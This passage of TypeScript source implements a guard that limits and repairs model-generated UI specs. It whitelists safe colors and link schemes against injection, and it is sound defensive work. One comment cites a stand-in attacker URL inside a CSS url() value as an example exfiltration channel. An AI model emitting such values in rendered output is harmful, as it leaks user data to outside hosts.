/**
 * GenUI spec guard: resource limits, structural validation, and deterministic
 * repair for ```dsh-ui fence specs.
 *
 * The renderer path runs every fence body through `repairGenuiSpec` before
 * rendering, so a pathological or hostile spec — deep nesting, thousands of
 * nodes, oversized strings, out-of-range numbers — degrades gracefully instead
 * of stalling the UI. Repair is deterministic and prefix-stable: a component
 * that survives repair of a partial stream keeps its position when later
 * chunks arrive, so streaming re-renders stay consistent.
 *
 * Policy:
 * - Unknown node `type`s pass through untouched (plugin-registered custom
 *   components via `registerGenuiComponent` are opaque to this package).
 * - Known types: required fields must have the right type or the node is
 *   dropped; numbers are clamped into range; strings truncated; arrays
 *   sliced to their caps; containers recursed with a depth budget.
 * - The whole spec carries a node budget; once exhausted, remaining siblings
 *   are elided.
 */
import type { GenuiFileTreeNode, GenuiList, GenuiNode, GenuiPlot, GenuiPlotSeries, GenuiScene3D, GenuiSpec } from './spec.ts'
import { wrapSingleComponentRoot } from './spec.ts'

/** Hard resource limits enforced by repair (and mirrored at render time). */
export const GENUI_LIMITS = {
  /** Maximum nesting depth of the component tree. */
  maxDepth: 8,
  /** Maximum total nodes across the whole spec. */
  maxNodes: 200,
  /** Maximum length of any plain string field. */
  maxString: 2000,
  /** Maximum length of a `code` body. */
  maxCode: 12_000,
  /** Maximum length of a mermaid source. */
  maxMermaid: 8000,
  /** Maximum `grid` columns. */
  maxGridCols: 12,
  /** Maximum `tabs` count. */
  maxTabs: 12,
  /** Maximum `accordion` items. */
  maxAccordionItems: 24,
  /** Maximum `list` items. */
  maxListItems: 50,
  /** Maximum `select`/`radio` options. */
  maxOptions: 50,
  /** Maximum `table` rows / columns. */
  maxTableRows: 50,
  maxTableCols: 12,
  /** Maximum `chart` data points per series. */
  maxChartPoints: 60,
  /** Maximum `plot` series and per-series parameters. */
  maxPlotSeries: 8,
  maxPlotParams: 6,
  /** Maximum `scene3d` meshes. */
  maxMeshes: 5,
  /** Maximum `quiz` options. */
  maxQuizOptions: 8,
  /** Maximum `steps` / `timeline` / `breadcrumb` / `keyvalue` entries. */
  maxSteps: 24,
  maxTimelineItems: 24,
  maxBreadcrumbItems: 12,
  maxKeyValuePairs: 24,
  /** Maximum `file-tree` nesting. */
  maxTreeDepth: 6,
} as const

/** Result of `validateGenuiSpec`. */
export interface GenuiValidation {
  ok: boolean
  /** Human-readable problems, empty when `ok`. */
  errors: string[]
}

/* ---------------- shared field helpers ---------------- */

/** Is `v` one of `values`? (enum guard) */
function inEnum<T extends string>(v: unknown, values: readonly T[]): v is T {
  return typeof v === 'string' && (values as readonly string[]).includes(v)
}

/** String field: truncate a string to `cap`, or undefined when not a string. */
function str(v: unknown, cap: number): string | undefined {
  return typeof v === 'string' ? v.slice(0, cap) : undefined
}

/**
 * Color field: the value lands in an inline `style` (background/stroke) or
 * THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
 * (or a hostile spec) could emit `url(https://attacker/track?...)` and the
 * browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
 * functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
 * to the component's default palette.
 */
const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/

function color(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : undefined
}

/**
 * Link target field: only http(s) and mailto survive. `javascript:`/`data:`
 * and every other scheme degrade to a plain-text node — the model's link is
 * display, not an execution channel.
 */
function safeHref(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  if (s.length > 2048) return undefined
  return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : undefined
}

/** Finite-number field: clamp into [min, max], or undefined when not finite. */
function num(v: unknown, min: number, max: number): number | undefined {
  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : undefined
}

/** Integer field: clamp into [min, max], or undefined when not a finite integer. */
function int(v: unknown, min: number, max: number): number | undefined {
  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, Math.trunc(v))) : undefined
}

/** Optional enum field: the value when it matches, otherwise undefined. */
function enu<T extends string>(v: unknown, values: readonly T[]): T | undefined {
  return inEnum(v, values) ? v : undefined
}

/** Plain object (not array, not null). */
function obj(v: unknown): Record<string, unknown> | undefined {
  return typeof v === 'object' && v !== null && !Array.isArray(v) ? v as Record<string, unknown> : undefined
}

/**
 * Optional-field spread helper. `exactOptionalPropertyTypes` forbids
 * `{ gap: number | undefined }`; computing the value into a const first and
 * spreading `opt('gap', g)` keeps every optional field either absent or a
 * plain value.
 */
function opt<K extends string, V>(key: K, value: V | undefined): Partial<Record<K, V>> {
  return value === undefined ? {} : { [key]: value } as Partial<Record<K, V>>
}

const TEXT_SIZES = ['h1', 'h2', 'h3', 'body', 'muted', 'caption'] as const
const BUTTON_TONES = ['primary', 'danger', 'success', 'ghost'] as const
const BADGE_TONES = ['success', 'warn', 'danger', 'accent'] as const
const INPUT_TYPES = ['text', 'email', 'password'] as const
const CALLOUT_TONES = ['info', 'success', 'warning', 'error'] as const
const CHART_KINDS = ['bars', 'line', 'donut'] as const
const PLOT_KINDS = ['line', 'area', 'scatter'] as const
const MESH_SHAPES = ['box', 'sphere', 'cone', 'cylinder', 'torus'] as const
const FILE_TYPES = ['file', 'dir'] as const

/* ---------------- repair ---------------- */

interface RepairCtx {
  /** Nodes left in the budget; 0 stops the walk. */
  remaining: number
}

/** Walk `list` with the shared node budget; drops invalid entries. */
function repairItems(list: unknown, ctx: RepairCtx, depth: number): GenuiNode[] {
  if (!Array.isArray(list)) return []
  const out: GenuiNode[] = []
  for (const item of list) {
    if (ctx.remaining <= 0) break
    ctx.remaining -= 1
    const node = repairNode(item, ctx, depth)
    if (node !== null) out.push(node)
  }
  return out
}

function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | null {
  if (depth > GENUI_LIMITS.maxDepth) return null
  const v = obj(value)
  if (v === undefined) return null
  const type = v.type
  if (typeof type !== 'string') return null
  switch (type) {
    case 'text': {
      const content = str(v.content, GENUI_LIMITS.maxString)
      if (content === undefined) return null
      return { type: 'text', content, ...opt('size', enu(v.size, TEXT_SIZES)), ...opt('center', v.center === true ? true : undefined) }
    }
    case 'row': {
      return { type: 'row', items: repairItems(v.items, ctx, depth + 1), ...opt('wrap', v.wrap === true ? true : undefined), ...opt('spacer', v.spacer === true ? true : undefined) }
    }
    case 'col': {
      return { type: 'col', items: repairItems(v.items, ctx, depth + 1), ...opt('gap', num(v.gap, 0, 96)) }
    }
    case 'grid': {
      return { type: 'grid', cols: int(v.cols, 1, GENUI_LIMITS.maxGridCols) ?? 1, items: repairItems(v.items, ctx, depth + 1) }
    }
    case 'card': {
      return { type: 'card', items: repairItems(v.items, ctx, depth + 1), ...opt('title', str(v.title, GENUI_LIMITS.maxString)) }
    }
    case 'button': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return {
        type: 'button', label,
        ...opt('tone', enu(v.tone, BUTTON_TONES)),
        ...opt('full', v.full === true ? true : undefined),
        ...opt('small', v.small === true ? true : undefined),
        ...opt('icon', str(v.icon, 64)),
        ...opt('action', str(v.action, 200)),
      }
    }
    case 'input': {
      return {
        type: 'input',
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('placeholder', str(v.placeholder, GENUI_LIMITS.maxString)),
        ...opt('value', str(v.value, GENUI_LIMITS.maxString)),
        ...opt('inputType', enu(v.inputType, INPUT_TYPES)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'select': {
      const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString)
      if (options === undefined) return null
      return {
        type: 'select', options,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('selected', int(v.selected, 0, options.length - 1)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'checkbox': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'checkbox', label, ...opt('checked', v.checked === true ? true : undefined), ...opt('action', str(v.action, 200)) }
    }
    case 'link': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'link', label, ...opt('href', safeHref(v.href)) }
    }
    case 'badge': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'badge', label, ...opt('tone', enu(v.tone, BADGE_TONES)), ...opt('icon', str(v.icon, 64)) }
    }
    case 'stat': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      const value = str(v.value, 128)
      if (label === undefined || value === undefined) return null
      return { type: 'stat', label, value, ...opt('delta', str(v.delta, 64)) }
    }
    case 'progress': {
      const value = num(v.value, 0, 100)
      if (value === undefined) return null
      return { type: 'progress', value, ...opt('label', str(v.label, GENUI_LIMITS.maxString)), ...opt('valueLabel', str(v.valueLabel, 64)) }
    }
    case 'divider': return { type: 'divider' }
    case 'spacer': return { type: 'spacer' }
    case 'avatar': {
      const name = str(v.name, 64)
      if (name === undefined) return null
      return { type: 'avatar', name, ...opt('color', color(v.color)) }
    }
    case 'list': {
      const items = repairListItems(v.items, GENUI_LIMITS.maxListItems)
      if (items === undefined) return null
      return { type: 'list', items }
    }
    case 'table': {
      const columns = repairStrings(v.columns, GENUI_LIMITS.maxTableCols, 128)
      const rows = repairRows(v.rows, GENUI_LIMITS.maxTableRows, GENUI_LIMITS.maxTableCols)
      if (columns === undefined || rows === undefined) return null
      return { type: 'table', columns, rows }
    }
    case 'chart': {
      const data = repairChartData(v.data, GENUI_LIMITS.maxChartPoints)
      const series = Array.isArray(v.series) ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints) : undefined
      // `data` is required by the type but grouped bars may ship `series`
      // alone; a series-only chart gets an empty data array (the renderer
      // reads `series` in that case).
      if (data === undefined && series === undefined) return null
      return { type: 'chart', data: data ?? [], ...opt('kind', enu(v.kind, CHART_KINDS)), ...opt('series', series) }
    }
    case 'tabs': {
      const tabs = repairTabs(v.tabs, ctx, depth)
      if (tabs === undefined) return null
      return { type: 'tabs', tabs }
    }
    case 'plot': {
      const series = repairPlotSeries(v.series, GENUI_LIMITS.maxPlotSeries)
      if (series === undefined) return null
      return {
        type: 'plot', series,
        ...opt('xMin', num(v.xMin, -1e6, 1e6)),
        ...opt('xMax', num(v.xMax, -1e6, 1e6)),
        ...opt('yMin', num(v.yMin, -1e9, 1e9)),
        ...opt('yMax', num(v.yMax, -1e9, 1e9)),
        ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
      }
    }
    case 'callout': {
      const content = str(v.content, GENUI_LIMITS.maxString)
      if (content === undefined) return null
      return { type: 'callout', content, ...opt('tone', enu(v.tone, CALLOUT_TONES)), ...opt('title', str(v.title, GENUI_LIMITS.maxString)) }
    }
    case 'steps': {
      const steps = repairSteps(v.steps)
      if (steps === undefined) return null
      return { type: 'steps', steps, ...opt('current', int(v.current, 0, steps.length)) }
    }
    case 'keyvalue': {
      const pairs = repairPairs(v.pairs, GENUI_LIMITS.maxKeyValuePairs)
      if (pairs === undefined) return null
      return { type: 'keyvalue', pairs }
    }
    case 'diff': {
      const diffs = repairDiffs(v.diffs)
      if (diffs === undefined) return null
      return { type: 'diff', diffs }
    }
    case 'json': {
      // Any JSON value is acceptable; only the node itself is validated.
      if (!('value' in v)) return null
      return { type: 'json', value: v.value }
    }
    case 'code': {
      const code = str(v.code, GENUI_LIMITS.maxCode)
      if (code === undefined) return null
      return { type: 'code', code, ...opt('lang', str(v.lang, 64)) }
    }
    case 'radio': {
      const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString)
      if (options === undefined) return null
      return {
        type: 'radio', options,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('selected', int(v.selected, 0, options.length - 1)),
        ...opt('action', str(v.action, 200)),
        ...opt('group', str(v.group, 200)),
        // answer: option index (number) or label (string); out-of-range
        // indices are DROPPED (clamping would silently grade against the
        // wrong option)
        ...opt('answer', typeof v.answer === 'number' && Number.isFinite(v.answer)
          && v.answer >= 0 && v.answer < options.length
          ? Math.trunc(v.answer)
          : typeof v.answer === 'string' ? v.answer.slice(0, 512) : undefined),
        ...opt('explanation', str(v.explanation, GENUI_LIMITS.maxString)),
      }
    }
    case 'submit': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      // action is OPTIONAL: local grading (any question carries `answer`)
      // needs no round trip, so a submit without an action is valid. It only
      // becomes semantically required when no local answers exist — the
      // renderer disables the button then (honest affordance).
      const action = str(v.action, 200)
      if (label === undefined) return null
      return {
        type: 'submit', label,
        ...opt('action', action),
        ...opt('resetAction', str(v.resetAction, 200)),
        ...opt('groups', repairStrings(v.groups, GENUI_LIMITS.maxOptions, 200)),
      }
    }
    case 'switch': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'switch', label, ...opt('checked', v.checked === true ? true : undefined), ...opt('action', str(v.action, 200)) }
    }
    case 'slider': {
      const min = num(v.min, -1e9, 1e9) ?? 0
      const max = num(v.max, -1e9, 1e9) ?? 100
      const lo = Math.min(min, max)
      const hi = Math.max(min, max)
      const step = num(v.step, 1e-9, Math.max(hi - lo, 1e-9))
      const value = num(v.value, lo, hi) ?? lo
      return {
        type: 'slider',
        min: lo,
        max: hi,
        ...opt('step', step),
        value,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'textarea': {
      return {
        type: 'textarea',
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('placeholder', str(v.placeholder, GENUI_LIMITS.maxString)),
        ...opt('rows', int(v.rows, 1, 30)),
        ...opt('value', str(v.value, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'accordion': {
      const items = repairAccordion(v.items, ctx, depth)
      if (items === undefined) return null
      return { type: 'accordion', items }
    }
    case 'copy': {
      const text = str(v.text, GENUI_LIMITS.maxCode)
      if (text === undefined) return null
      return { type: 'copy', text, ...opt('label', str(v.label, 128)) }
    }
    case 'mermaid': {
      const code = str(v.code, GENUI_LIMITS.maxMermaid)
      if (code === undefined) return null
      return { type: 'mermaid', code }
    }
    case 'scene3d': {
      const meshes = repairMeshes(v.meshes)
      if (meshes === undefined) return null
      return { type: 'scene3d', meshes, ...opt('title', str(v.title, GENUI_LIMITS.maxString)), ...opt('ambient', num(v.ambient, 0, 2)), ...opt('background', color(v.background)) }
    }
    case 'timeline': {
      const items = repairTimeline(v.items, GENUI_LIMITS.maxTimelineItems)
      if (items === undefined) return null
      return { type: 'timeline', items }
    }
    case 'file-tree': {
      const items = repairTree(v.items, GENUI_LIMITS.maxListItems)
      if (items === undefined) return null
      return { type: 'file-tree', items }
    }
    case 'breadcrumb': {
      const items = repairStrings(v.items, GENUI_LIMITS.maxBreadcrumbItems, GENUI_LIMITS.maxString)
      if (items === undefined) return null
      return { type: 'breadcrumb', items }
    }
    case 'quiz': {
      const question = str(v.question, GENUI_LIMITS.maxString)
      const options = repairQuizOptions(v.options)
      if (question === undefined || options === undefined) return null
      return {
        type: 'quiz', question, options,
        ...opt('explanation', str(v.explanation, GENUI_LIMITS.maxString)),
        ...opt('id', str(v.id, 200)),
        ...opt('action', str(v.action, 200)),
      }
    }
    default:
      // Plugin-registered custom node types are opaque to the guard: pass
      // through unchanged (the renderer's default branch resolves them).
      return value as GenuiNode
  }
}

/* ---------------- per-type sub-repairers ---------------- */

function repairStrings(v: unknown, cap: number, strCap: number): string[] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: string[] = []
  for (const item of v) {
    if (out.length >= cap) break
    if (typeof item === 'string') out.push(item.slice(0, strCap))
  }
  return out
}

function repairListItems(v: unknown, cap: number): GenuiList['items'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiList['items'] = []
  for (const item of v) {
    if (out.length >= cap) break
    if (typeof item === 'string') {
      out.push(item.slice(0, GENUI_LIMITS.maxString))
      continue
    }
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, GENUI_LIMITS.maxString)
    if (title === undefined) continue
    out.push({ title, ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)) })
  }
  return out
}

function repairRows(v: unknown, rowCap: number, colCap: number): Array<Array<string | number>> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<Array<string | number>> = []
  for (const row of v) {
    if (out.length >= rowCap) break
    if (!Array.isArray(row)) continue
    const cells: Array<string | number> = []
    for (const cell of row) {
      if (cells.length >= colCap) break
      if (typeof cell === 'string') cells.push(cell.slice(0, 256))
      else if (typeof cell === 'number' && Number.isFinite(cell)) cells.push(cell)
    }
    if (cells.length > 0) out.push(cells)
  }
  return out
}

function repairChartData(v: unknown, cap: number): Array<{ label: string; value: number; color?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; value: number; color?: string }> = []
  for (const datum of v) {
    if (out.length >= cap) break
    const o = obj(datum)
    const label = o === undefined ? undefined : str(o.label, 128)
    const value = o === undefined ? undefined : num(o.value, -1e12, 1e12)
    if (label === undefined || value === undefined) continue
    out.push({ label, value, ...opt('color', o === undefined ? undefined : color(o.color)) })
  }
  return out
}

function repairSeries(v: unknown, cap: number, pointCap: number): Array<{ label: string; color?: string; data: Array<{ label: string; value: number; color?: string }> }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; color?: string; data: Array<{ label: string; value: number; color?: string }> }> = []
  for (const s of v) {
    if (out.length >= cap) break
    const o = obj(s)
    const label = o === undefined ? undefined : str(o.label, 128)
    const data = o === undefined ? undefined : repairChartData(o.data, pointCap)
    if (label === undefined || data === undefined) continue
    out.push({ label, data, ...opt('color', o === undefined ? undefined : color(o.color)) })
  }
  return out
}

function repairTabs(v: unknown, ctx: RepairCtx, depth: number): Array<{ label: string; items: GenuiNode[] }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; items: GenuiNode[] }> = []
  for (const tab of v) {
    if (out.length >= GENUI_LIMITS.maxTabs) break
    const o = obj(tab)
    const label = o === undefined ? undefined : str(o.label, 128)
    if (label === undefined || o === undefined) continue
    out.push({ label, items: repairItems(o.items, ctx, depth + 1) })
  }
  return out
}

function repairPlotSeries(v: unknown, cap: number): GenuiPlot['series'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiPlot['series'] = []
  for (const s of v) {
    if (out.length >= cap) break
    const o = obj(s)
    const expr = o === undefined ? undefined : str(o.expr, 512)
    if (expr === undefined || o === undefined) continue
    const params: NonNullable<GenuiPlotSeries['params']> = []
    if (Array.isArray(o.params)) {
      for (const p of o.params) {
        if (params.length >= GENUI_LIMITS.maxPlotParams) break
        const po = obj(p)
        const name = po === undefined ? undefined : str(po.name, 64)
        const value = po === undefined ? undefined : num(po.value, -1e9, 1e9)
        if (name === undefined || value === undefined) continue
        params.push({
          name, value,
          ...opt('min', po === undefined ? undefined : num(po.min, -1e9, 1e9)),
          ...opt('max', po === undefined ? undefined : num(po.max, -1e9, 1e9)),
          ...opt('step', po === undefined ? undefined : num(po.step, 1e-9, 1e9)),
          ...opt('animateTo', po === undefined ? undefined : num(po.animateTo, -1e9, 1e9)),
          ...opt('durationMs', po === undefined ? undefined : num(po.durationMs, 1, 120_000)),
          ...opt('loop', po === undefined ? undefined : po.loop === true ? true : undefined),
        })
      }
    }
    out.push({ expr, ...opt('label', str(o.label, 128)), ...opt('color', color(o.color)), ...opt('kind', enu(o.kind, PLOT_KINDS)), ...opt('params', params.length > 0 ? params : undefined) })
  }
  return out
}

function repairSteps(v: unknown): Array<{ title: string; desc?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; desc?: string }> = []
  for (const s of v) {
    if (out.length >= GENUI_LIMITS.maxSteps) break
    const o = obj(s)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined) continue
    out.push({ title, ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)) })
  }
  return out
}

function repairPairs(v: unknown, cap: number): Array<{ key: string; value: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ key: string; value: string }> = []
  for (const p of v) {
    if (out.length >= cap) break
    const o = obj(p)
    const key = o === undefined ? undefined : str(o.key, 256)
    const value = o === undefined ? undefined : str(o.value, GENUI_LIMITS.maxString)
    if (key === undefined || value === undefined) continue
    out.push({ key, value })
  }
  return out
}

function repairDiffs(v: unknown): Array<{ path: string; oldText: string | null; newText: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ path: string; oldText: string | null; newText: string }> = []
  for (const d of v) {
    if (out.length >= 24) break
    const o = obj(d)
    const path = o === undefined ? undefined : str(o.path, 1024)
    const newText = o === undefined ? undefined : str(o.newText, 20_000)
    if (path === undefined || newText === undefined) continue
    const old = o === undefined ? undefined : o.oldText
    out.push({ path, newText, oldText: old === null || typeof old !== 'string' ? null : old.slice(0, 20_000) })
  }
  return out
}

function repairAccordion(v: unknown, ctx: RepairCtx, depth: number): Array<{ title: string; items: GenuiNode[] }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; items: GenuiNode[] }> = []
  for (const item of v) {
    if (out.length >= GENUI_LIMITS.maxAccordionItems) break
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined || o === undefined) continue
    out.push({ title, items: repairItems(o.items, ctx, depth + 1) })
  }
  return out
}

function repairMeshes(v: unknown): GenuiScene3D['meshes'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiScene3D['meshes'] = []
  for (const m of v) {
    if (out.length >= GENUI_LIMITS.maxMeshes) break
    const o = obj(m)
    const shape = o === undefined ? undefined : enu(o.shape, MESH_SHAPES)
    if (shape === undefined) continue
    const scale = o === undefined ? undefined : num(o.scale, -1e6, 1e6) ?? tuple3(o.scale)
    const size = o === undefined ? undefined : num(o.size, -1e6, 1e6) ?? tuple3(o.size)
    out.push({
      shape,
      ...opt('color', o === undefined ? undefined : color(o.color)),
      ...opt('position', o === undefined ? undefined : tuple3(o.position)),
      ...opt('rotation', o === undefined ? undefined : tuple3(o.rotation)),
      ...opt('scale', scale),
      ...opt('size', size),
    })
  }
  return out
}

function tuple3(v: unknown): [number, number, number] | undefined {
  if (!Array.isArray(v) || v.length !== 3) return undefined
  const [a, b, c] = v
  if (typeof a !== 'number' || !Number.isFinite(a) || typeof b !== 'number' || !Number.isFinite(b)
    || typeof c !== 'number' || !Number.isFinite(c)) return undefined
  return [Math.min(1e6, Math.max(-1e6, a)), Math.min(1e6, Math.max(-1e6, b)), Math.min(1e6, Math.max(-1e6, c))]
}

function repairTimeline(v: unknown, cap: number): Array<{ title: string; desc?: string; time?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; desc?: string; time?: string }> = []
  for (const item of v) {
    if (out.length >= cap) break
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined) continue
    out.push({
      title,
      ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)),
      ...opt('time', o === undefined ? undefined : str(o.time, 128)),
    })
  }
  return out
}

function repairTree(v: unknown, cap: number): GenuiFileTreeNode[] | undefined {
  // Recursion is bounded by GENUI_LIMITS.maxTreeDepth (see the inner walk).
  return walkTree(v, cap, GENUI_LIMITS.maxTreeDepth)
}

function walkTree(v: unknown, cap: number, depthLeft: number): GenuiFileTreeNode[] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiFileTreeNode[] = []
  for (const item of v) {
    if (out.length >= cap) break
    const o = obj(item)
    const name = o === undefined ? undefined : str(o.name, 256)
    if (name === undefined) continue
    const children = o !== undefined && depthLeft > 0 && Array.isArray(o.children) ? walkTree(o.children, cap, depthLeft - 1) : undefined
    out.push({ name, ...opt('type', o === undefined ? undefined : enu(o.type, FILE_TYPES)), ...opt('children', children) })
  }
  return out
}

function repairQuizOptions(v: unknown): Array<{ label: string; correct?: boolean; feedback?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; correct?: boolean; feedback?: string }> = []
  for (const optItem of v) {
    if (out.length >= GENUI_LIMITS.maxQuizOptions) break
    const o = obj(optItem)
    const label = o === undefined ? undefined : str(o.label, 512)
    if (label === undefined) continue
    out.push({
      label,
      ...opt('correct', o === undefined ? undefined : o.correct === true ? true : undefined),
      ...opt('feedback', o === undefined ? undefined : str(o.feedback, GENUI_LIMITS.maxString)),
    })
  }
  return out
}

/**
 * Deterministically repair a raw spec value into a renderable GenuiSpec.
 * Returns null only when the root is not an object with an `items` array
 * (a bare component root is wrapped into a col first — the documented fence
 * vocabulary allows single-component bodies); every other defect is healed by
 * dropping/clamping/truncating. Idempotent: repairing a repaired spec is a
 * no-op.
 */
export function repairGenuiSpec(value: unknown): GenuiSpec | null {
  const v = obj(value)
  if (v === undefined) return null
  if (!Array.isArray(v.items)) {
    const wrapped = wrapSingleComponentRoot(value)
    if (wrapped === null) return null
    return repairGenuiSpec(wrapped)
  }
  const ctx: RepairCtx = { remaining: GENUI_LIMITS.maxNodes }
  return {
    ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
    ...opt('gap', num(v.gap, 0, 96)),
    ...opt('panel', v.panel === true ? true : undefined),
    ...opt('append', v.append === true ? true : undefined),
    items: repairItems(v.items, ctx, 0),
  }
}

/* ---------------- validation ---------------- */

/**
 * Count the nodes of a spec tree (every item, descending into tabs /
 * accordion / file-tree containers — the same descent `validateGenuiSpec`
 * walks). Shared by the panel fold (node-budget gate) and validation, so
 * the panel never runs a second, divergent traversal. `cap` bounds the walk
 * for hostile inputs; the panel passes `PANEL_LIMITS.maxNodes + 1` to detect
 * overflow without counting the whole tree.
 */
export function countGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY): number {
  let count = 0
  const walk = (list: unknown): void => {
    if (!Array.isArray(list)) return
    for (const item of list) {
      if (count >= cap) return
      count += 1
      const v = obj(item)
      if (v === undefined) continue
      if (v.type === 'tabs' && Array.isArray(v.tabs)) {
        for (const t of v.tabs) {
          if (count >= cap) return
          const to = obj(t)
          if (to !== undefined) walk(to.items)
        }
      } else if (v.type === 'accordion' && Array.isArray(v.items)) {
        for (const it of v.items) {
          if (count >= cap) return
          const io = obj(it)
          if (io !== undefined) walk(io.items)
        }
      } else if (v.type === 'file-tree' && Array.isArray(v.items)) {
        walk(v.items)
      }
    }
  }
  const root = obj(value)
  walk(root === undefined ? [] : root.items)
  return count
}

/**
 * Validate a raw spec value against the white list and limits, collecting
 * human-readable problems. Unlike repair this never mutates: it is a
 * diagnostic for tests and tooling. Unknown `type`s are reported (a plugin
 * custom type is valid only when a renderer is registered — the guard cannot
 * know, so it flags them as warnings).
 */
export function validateGenuiSpec(value: unknown): GenuiValidation {
  const errors: string[] = []
  const v = obj(value)
  if (v === undefined) return { ok: false, errors: ['spec root must be an object'] }
  if (!Array.isArray(v.items)) {
    // Single-component root: validate through the wrapped form so the tool
    // agrees with the renderer about what is a valid fence body.
    const wrapped = wrapSingleComponentRoot(value)
    if (wrapped !== null) return validateGenuiSpec(wrapped)
    return { ok: false, errors: ['spec.items must be an array'] }
  }
  if (v.title !== undefined && typeof v.title !== 'string') errors.push('spec.title must be a string')
  if (v.gap !== undefined && (typeof v.gap !== 'number' || !Number.isFinite(v.gap))) errors.push('spec.gap must be a finite number')
  let count = 0
  let capped = false
  const walk = (list: unknown, depth: number, path: string): void => {
    if (capped) return
    if (!Array.isArray(list)) {
      errors.push(`${path} must be an array`)
      return
    }
    for (let i = 0; i < list.length; i++) {
      if (capped || count >= GENUI_LIMITS.maxNodes) {
        if (!capped) {
          errors.push(`spec exceeds ${GENUI_LIMITS.maxNodes} nodes; tail elided`)
          capped = true
        }
        return
      }
      count += 1
      const at = `${path}[${i}]`
      validateNode(list[i], depth, at, errors, walk)
    }
  }
  walk(v.items, 0, 'items')
  return { ok: errors.length === 0, errors }
}

type Walker = (list: unknown, depth: number, path: string) => void

function validateNode(value: unknown, depth: number, at: string, errors: string[], walk: Walker): void {
  if (depth > GENUI_LIMITS.maxDepth) {
    errors.push(`${at}: exceeds max depth ${GENUI_LIMITS.maxDepth}`)
    return
  }
  const v = obj(value)
  if (v === undefined) {
    errors.push(`${at}: must be an object`)
    return
  }
  const type = v.type
  if (typeof type !== 'string') {
    errors.push(`${at}: missing string 'type'`)
    return
  }
  const isStr = (name: string): void => { if (v[name] !== undefined && typeof v[name] !== 'string') errors.push(`${at}: '${name}' must be a string`) }
  const isNum = (name: string): void => { if (v[name] !== undefined && (typeof v[name] !== 'number' || !Number.isFinite(v[name]))) errors.push(`${at}: '${name}' must be a finite number`) }
  switch (type) {
    case 'text':
      if (typeof v.content !== 'string') errors.push(`${at}: type 'text' requires content (string)`)
      isStr('content')
      break
    case 'row': case 'col': case 'card': case 'grid':
      if (!Array.isArray(v.items)) errors.push(`${at}: type '${type}' requires items (array)`)
      walk(v.items, depth + 1, `${at}.items`)
      if (type === 'grid') isNum('cols')
      break
    case 'button': case 'checkbox': case 'link': case 'switch':
      if (typeof v.label !== 'string') errors.push(`${at}: type '${type}' requires label (string)`)
      isStr('label')
      break
    case 'slider':
      isStr('label')
      isNum('min'); isNum('max'); isNum('step'); isNum('value')
      break
